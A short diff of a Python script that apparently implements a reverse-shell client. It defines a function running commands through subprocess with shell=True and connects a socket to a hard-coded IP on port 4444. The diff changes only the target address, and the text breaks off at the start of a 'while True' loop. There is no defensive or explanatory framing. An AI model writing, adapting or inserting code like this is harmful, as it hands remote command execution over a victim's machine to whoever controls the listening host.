@@ -6,7 +6,7 @@ connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True)
 
-connection.connect(('172.25.224.228', 4444))
+connection.connect(('172.25.252.233', 4444))
 connection.send(b'Hello, Server! \n')
 
 while True:
